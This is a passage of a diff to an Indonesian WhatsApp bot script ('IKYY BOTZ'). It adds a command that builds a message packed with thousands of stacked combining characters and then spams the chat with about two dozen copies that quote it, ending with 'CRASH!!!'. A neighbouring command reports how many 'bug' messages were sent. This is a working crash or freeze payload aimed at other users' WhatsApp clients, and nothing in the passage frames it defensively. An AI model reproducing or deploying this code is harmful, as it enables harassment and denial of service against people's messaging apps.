̸̵ًًًًٌٌٌٍٍٍََََُُُِِِّّّ̨̛͇͙̺̦͍̬͔͚̖̝̓ͧ̂̑̀͆̾ͯ͌͐̎͟͡͞͠͏ًٌٌٍٍَُُِِّّ̧̢̢̧̡̫̝̬̲̑̑̔̓̍̾̾͛͘͘͞͏̴̴̸ًًٌٌٍٍَََُُِِّّ̢̨̬̳̫͉͓̺̱̖́̀́ͪͨ̅̓̽̋ͫ̒͢͝͡͏ًُ̮̽҉̶̸̶̷ًًًٌٌٌٌٍٍٍَََُُُِِِِّّّ̡̡̧̛̖̪̗̝̭̺̠͍̼̜͋̒̀̇̃͊ͤͦ̾͜͝͏̵̵̷̶̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̢̛̘̼̭̜̤̱̬̬̣̗̹̝̱͙̝͓̗͎̗ͫ̀ͮͬ̽̓̈͌̈̍̈́ͥ̈́̀̈̆ͬ̕͘͘͘͟͢͞͡͠͞ͅ͏̸̴ًٌٍٍََُِّّ̛͔̳͇̩͉̅ͫ̂ͨ̀ͯͯ͘͠͠҉̸ًًًٌٌٌٍٍٍََُُُِِِّّ̢̧̢̢̩̙̯͈͈̟̤͍̫͋̾̏́̿̓͒͆̎̿̓͑͢͝ͅ҉̸̶̶̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̡̡̛̣͈̬̹̹̥͖̭̟͓̙̹̖̻̬͖̖̭ͦͤͨ̿̓̈́̍͆̓ͪ̉́̉͒̈́ͯ̀̀ͭ̚̕͟͟͢͠͠͝͡͞͞͝҉̷̷̸̵̵̷̶̴̷̵̸̸̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِّّّّّّّّّّّّّّ̧̡̢̡̡̢̧̡̧̧̧̛̛̛̛̯̼̗͇̯̱̤͖̫̜̺̦̺͕͖̝̜̱̬̱͇̫͔̥͉̣̪̹͈̼̦̰͙̰̰̗̥̘͖̳͓̦̘͎̦̜̖̙̱̑̑́̃̔̄͑ͫ̄͗ͤ͒̋̏̑̿́ͤ̽̏ͥ͛ͣ̐ͦ̓̈́́̽̔̾ͧͤ̌̊͑ͮ̽͒̃͑̂̋̄̅̔̎͆͑̃̈́͋̊̏̀̌̂̌͘̚͘͟͟͜͜͝͡͡͡͞͠͝͠͞ͅ͏ًٌٍَِّ̨͕̇͢҉̸̷̵̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̢̧̧̡̢̧̛̟̭͔̩͍̱͙̺̙̘͚͉̠̻̟̭̪͚̟̪̭̥͈͓̞̗̠͓͓̱̰̦̪̔̒̈́͐͆͋̅ͨͧ̅͋̿͆̏̀͛͋̓̍̀ͣ͒̃͑́ͦͯͯ̾̀ͬ̆̕̕͟͢͝͞͡͞͡͝҉̵̸̷̸ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̧̨̧̧̨̧̢̡̲̟̜̞͎̭͙̜̪̗̯̯̣͎̙͎͈̙̗͈̬̭̥̫͕͇̹͖̑ͪͨͣͮ́͒̌́̐̀̍͐̊̈́̈̓̍̓ͪ͊ͩͩͩͯ̀̌ͬ̂̒ͧͪ͛̓̕̕͘͢͜͟͢͜͡͝͠҉̶ًٌٍَُِّ̻͍̥̉͂̌ͫ͗͝͏̴ًًٌٌٌٍٍٍََُُِِِّّ̢̮̺̝̥͈͕͙̅́̈́ͫͪ̓́̎͛̊ͧ̅͜͜͡͏̷ًٌٍََُِّّ̡̨͕͓͍̠̖͈ͩ͜͜͝͏̷̸̸̴̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̡̛̠̻̯̻̠̩̲̭͈̬̬̞̮͇̙̖͕̥̠̞̠̪͚̥̪͇̬̍ͭ͆ͫ̉̆̓ͨͪͩ̒̄̍͆̀͗̓ͣ̇̔ͨ̋̚̚͜͜͜͢͜͟͢͢͠͡͝͡҉̸̸ًًٌٌٌٍٍٍََُُُِِِّّّ̢̡̛̦̥͚̠̖̼̱̟̯̭͕ͥ͋ͩ́̑ͪ͐̐̊ͨ͑͋͒̕̕͠͠͏̷ًًًٌٌٍٍَََُُِِّّ̨͖̖̯̩͍̩͖͖̼͊̍͆̑ͩ͗́̃̀ͣ̌̒͝͏̶̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̦͕̳͇͔̮̓̓̽͆͊ͮ́̄ͤ̑͑͘͠͞͏ٌُ̣̠͠҉̸̵ًٌٍٍَُِِّّ̪̖̹̤͍͚͊̽́ͨ̉ͩ͂̅̊͡͡͡҉ًًٌٍََُُِّ̢̢̱͍͍͖ͣͥ́ͣ͆̕͟ͅ҉̴ٌٍَِّ̧̳ͪ͘͏̷ًًٌٌٍَُُِّ͕̠̱̫̫͎̦ͣͭͭ̑̅͘҉ٍِّ̼͓̔̀̈́͟҉ًٌٍَُِّ̨̼̋̔́͊̚͏̵ًًٌٌٍََُُِّ̨͙͉̗̩̣̝ͫ̅̃̾ͤ͌́ͤͯ͐͢͡҉̴̸̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̡̢̨̧̡̛̙͖̹͔̦͚̥̘̯̱̞̭͉̂̓̈́́́͌́̊͂̈͒͑͊̈́̆ͯ͘͜͜͝͡͝͏̵̸̵̴̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّ̡̢̢̧̧̦͎͈̗͔̳̰͍̞͉̪͈̺̣̞̗̗̰̥̖͒̑̓̍̒ͣ͂͗́ͮ̽̒̏͂̓̏͆͋͛́͘̕͜͢͜͢͝͡͞͡͠͡͝҉̸ًًٌٌٍٍََُُِِّّ̡̢̧͉̙̭̣̫͖͕̳̣̮ͣ̌̾̓̃ͥ͐́̍͠҉̷ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧͈̖͓̬̙̳̥͓̺͒̅̑͆ͩ́͛̅ͩ̀͂̀ͫ͘͘͞͝͝͡͝ͅ͏َ̙́͏̵̴̸̷̸̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̧̢̨̢̨̰̺̗͍͔͔̳͕̻̰̰͉̠̻͕̺̙̻̓ͬ̇ͪͤͦ̄̄̃͋͂̄ͥͧ͆̐ͦ̾̎ͭ͒̚͟͠ͅ҉̴̶ًًًٌٌٍٍٍَََُُِِّّّ̟̤̯͔̖̟͇́̽͂̄͗ͤ̓͑̂͌̉̕͘͜͠͠ͅͅ͏̴̶̷̵̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̡̢̨̛̛̮̰͎̣̳̖̻͉̫̼̩̙͍͎̮͈͓̪̭̼̠̞̲̬̘͍̫̙̰͎ͯ̀̀ͣ̃̊͒ͣͧ̉͆̾́̀̈́ͯ̈ͦ͗̇͆̇̔̅̊́͊̊̄̇͂͒̒̃ͧͯ̌́̂̓̕͢͜͢͢͟͜͟͞͝͝͝͝ͅ҉̷ًٍَُِّ̧͖̲̜ͤ̈́͝͏ٌٍِ͈̮̂͏̵̶ًًٌٍََُُِّّ̫͈̥̻̳̺̣͈̓̂̍ͪ̇̍͜҉̸̴ًٌٌٍٍََُِِّّ͈͖̖̬͐ͯͣ̔́̐ͧ̕͜͡͏̴̵̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̨̢̩͇͍̥̞̜̻̺͓̰̳͈̘͖̳̭̬̥̮̠ͫͬ̿́̑̇́̄̄̎ͥ̃ͮ̓̃̂̀͆̐̉̿̍̽̆̓ͥ̕̕͢͞͠͡͝͞͞͠͞҉ُ̭́͏̴̶̶ًًٌٌٌٍٍٍََُُِِِّّّ̛͇̣̝̠̺̩͇͛͋́ͤ̿̉́ͩ̉́́ͥ̅͘͜͏̵̵̸̶̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̨̡̡̨̛̛̛̯̩͈̺̘͈͖̣̠͕̪̦̺̬̠̦̆͂̄ͫ̾ͫ̓̌̂̌̂ͭͯ͆̉̊͌̉͛̓̌ͬͫ͂̕̕͘͜͜͞͠͞͡͡͝҉̸ٌٍُِ̛̜͓̒ͨ͏̸ًٌٍَُِّّ̢͙̲̝̩̒̐ͭͤ̄̕͜͡҉̷̵̶̵̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̢̨̢̡̛̛͔͇̥͓̭̟̯͇̤͙̭̻͓͖̤̦̜̝͎͓̜̱͔͙̿̋̃ͤ͒̆͑ͫ̌͗̈́̀̍ͮ͘͘͢͟͟͜͞͝͞͠ͅ҉ًٌٍَُِّ̡̳̻͙̫͛͑̀͟҉̸ًًٌٍَُُِّ̩͇̪͗̈̒̈́͟ͅ͏ٌٍِ͎͛̔͡҉̵ًٌَُِّ̝͕͚̤̰̓̂͛̓̔͡҉ٍ̦̅͏̷̸̴̶̸̷ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِّّّّّّّّ̨̢̧̨̧̛̛͇͉͎͙̯͚̹̲͔͕̫̭̰̲͉̜͚͙̭̻̖̰̊ͫ̔̇̓̓̋͊̈́̎̄̂̈́́̿̀̒́̊͐̀͌̊̌ͩ̚͘̕̕͘̕͟͟͜͠͡͠͏̴ًًٌٌٍٍََُُِِّّ̧̡̡͈͖̟͕̱̦̞̥ͭ͗̎ͯ̋͋͘͟͞͠͡͏̵̴̶̸̸̸̵̵̶̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̡̨̢̡̢̧̛̛̩͎͓̙̞̩̟̲̖͎̖̭̙̥̜͓͓̠̳̤̪̬͚͍͈̲̤̯̬͔͚̩̝͉ͥ̐ͭͬ̓͐̒͒͊̅̂ͨ̄̎͗͂̏̍͐ͤͫͣ͋ͦ̈̌͌́̃̓͐ͫ̔͗͐̀̌͊ͭ̕̕̕͜͢͟͢͞͞͡͡͠͝ͅ҉̶̸̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̧̡̨̢̢̢̢̛̣̟̺̼͕̮̹̱̳̱͚̼̟͍̝̦ͭͭ̂ͮͭ́̈̈͆͒ͨ̋͐ͨ̉ͧ͢͢͞͠ͅ͏̵̷̵ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̨̨̥̠̝̱͓̫̞̻͉͍̱̟͙͉̲̪̠̌̀͆̎̅̆̅́́̈̀͊ͫͭͥ̆͘͘͢͟͠͡͞҉̴̵̷̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّ̧̡̡̫̝͙͔̙̺̞͔̬̝͈̞͎̦̏̀͑ͩ́̀͆̐͋̏͌̉ͯ̉ͧ͆̕͘͢͠͝͡͝͡҉̶̵̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̢̨̛͔̦̹̲̣̖̺͔̗̥̝̤̙̘͙̗̣̐̿́͑͋ͮ̾͌̈́̀ͩ̊͊͑ͭ̓ͮ͘͘͘̕͟͜͞҉̸̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̛̞̮͈͎̳̠̞͓̩̗̼̖̘̖̰̔̈̊͐͐̽̅̃̽͛̀͑́ͯ̊͐́͂ͭ̐͘̕̕͘͠҉̵̸̵̴̸ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̢͔̖̟͚͚͕̮̦̼̣̘̼̎̉ͨ̽ͬͤ͛̾̏ͯ͋̏͊ͥ̇̀̀͋͌͜͟͢͢͞͠͡͡҉̶ًٌٍٍَُِّ̞̖̖̹͎̓̅́͊ͮ̕͠҉̷̴̶̷ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̨̖̲͚͎̳̳̤̫̮̗͇̯͚̬̿̀͗̄̐ͩͨ̓̀ͤ̓͒͘͢͟͟͠͠͞͞͠͝͏̷̷̵ًًًٌٌٍٍٍَََُُِِِّّّ͎͔̺̱̭͓̻̲̬͎̬̉̂̀ͮ̀̂̃ͩͣ̏͂ͫ̑͘͠͡͏̵̸̴̵ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̛̛̹̤̪͍̗̝̹̟̟͙͚̮͍̠̬͍͔͚̥̅̆̃̂̐͆ͦ̂̈̓ͤͦ̊̚͘͘͟͜͢͜͜͡͝͡͡҉ًَّͪ́͌͝͏̸ًٌٍَُِّ̢̯̩͖̓ͥ̿҉̸̸̴̶̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̨͕̦̺͓̥̳͈̳͉̦͍͉̦̮̑̐̑ͧͭ̎͊ͥ͋̈́̀̾̍ͬͣ̌̉̒̉͊̕͟͡͞͏̵̵̶ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̡̡͕̖͉͈̯̮̳͕̪͖͊͒́ͥ̇̒ͭ̉͋͂͑͘̕͘̕͟͢͢͠ͅ͏̵̶̵̷̴̸̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̡̧̧̢̢̡̨̢̡̧̛̛̛̤̻͙̜̳̤͖̱̝̳̫̞̼͕͕̬̙̖̦̱̙̘̭̦̤̻̜̬̫̲̖̬̦̳͓͈̻̞̲̗͉̫͙̲̎͑̂́̂͛͒̓̋͛̊̿̉̎́́̌̇͊̊ͤ̾̔̾̓́̊̔̏̽̅̄ͩ̔̔̆̓̀ͮͭ̈̍͊͑̒̈́͑̀́̂͘̕̕͘̚̚̕͟͢͡͡͡͡͝͠͡͡ͅͅͅ҉̶̶ًًٌٌٌٍٍٍََُُِِِّّ̨̛͓̭͉͔̻̌̒͒̂͋͌͐̀ͭ͗̅͋̕͠͡҉̵̶̶ًًٌٌٍٍَََُُِِّّّ̢̤̭͇̤͓̙̹͍͓͆́ͬ̌͛̀̀͂͘̕͜͠͡͠ͅ`,
+ "jpegThumbnail": virgam
+ } 
+ } 
+ }
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:asukonyol11})
+ jancok(`© THE IKYY BOTZ`)
+ jancok(`© THE IKYY BOTZ`)
+ }
+ break
  case 'permisibang':{
  if (!isCreator && !isBan) return
    asukonyol11 = { 
@@ -7473,7 +7554,7 @@ await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
 jancok(`Sukses Send bug Sebanyak ${jumlah}`)
 }
             break
-
+            
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
